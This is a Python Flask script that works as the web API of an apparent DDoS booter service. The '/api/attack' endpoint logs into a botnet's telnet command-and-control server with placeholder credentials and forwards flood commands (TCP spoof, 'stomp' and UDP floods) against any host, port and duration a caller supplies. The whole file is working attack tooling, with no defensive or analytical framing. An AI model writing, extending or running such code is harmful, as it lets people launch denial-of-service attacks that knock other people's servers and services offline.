from flask import Flask, request, jsonify
import socket
import threading
import time

app = Flask(__name__)
port = 3000

# Config telnet botnet
cnc_host = 'BOTNET_IP'
cnc_port = 1337
username = "BOTNET_USER"
password = "BOTNET_PASS"

sock = None

def acceptedconn():
    global sock
    try:
        sock = socket.create_connection((cnc_host, cnc_port))
        print('Connected to the Telnet server')

        
        sock.sendall(b" \r\n")
        time.sleep(0.5)  
        sock.sendall(f"{username}\r\n".encode())
        time.sleep(0.5) 
        sock.sendall(f"{password}\r\n".encode())
    except Exception as e:
        print('Failed to connect to the Telnet server:', str(e))
        sock = None


def checkconn():
    while True:
        if not sock or sock._closed:
            print('Connection lost. Reconnecting...')
            acceptedconn()
        time.sleep(30)

threading.Thread(target=checkconn, daemon=True).start()
acceptedconn()

@app.route('/api/attack', methods=['GET'])
def api_attack():
    global sock
    if not sock or sock._closed:
        acceptedconn()

    host = request.args.get('host')
    port = request.args.get('port', type=int)
    time_duration = request.args.get('time', type=int)
    method = request.args.get('method')

    print({
        'host': host,
        'port': port,
        'time': time_duration,
        'method': method
    })

    methods = ["TCP-SPOOF", "STOMP", "PLAIN"]
    if not host:
        return jsonify(status=500, data="invalid target")
    if port is None or port < 0 or port > 65535:
        port = 0
    if not time_duration or time_duration > 60:
        return jsonify(status=500, data="invalid attack duration")
    if method not in methods:
        return jsonify(status=500, data="invalid attack method")

    target_port = f" dport={port}" if port > 0 else ""

    if method == "TCP-SPOOF":
        full_command = f"wraflood {host} {time_duration} {target_port}\r\n"
    elif method == "STOMP":
        if not target_port:
            return jsonify(status=500, data="invalid attack port (needed for this method)")
        full_command = f"stomp {host} {time_duration} {target_port} minsize=800 maxsize=1400\r\n"
    elif method == "PLAIN":
        full_command = f"udpflood {host} {time_duration} {target_port} minsize=1000 maxsize=1400\r\n"

    print(full_command)
    try:
        sock.sendall(full_command.encode())
        return jsonify(status=200, data="attack started")
    except Exception as e:
        return jsonify(status=500, data=f"failed to send attack command: {str(e)}")

if __name__ == '__main__':
    app.run(port=port)
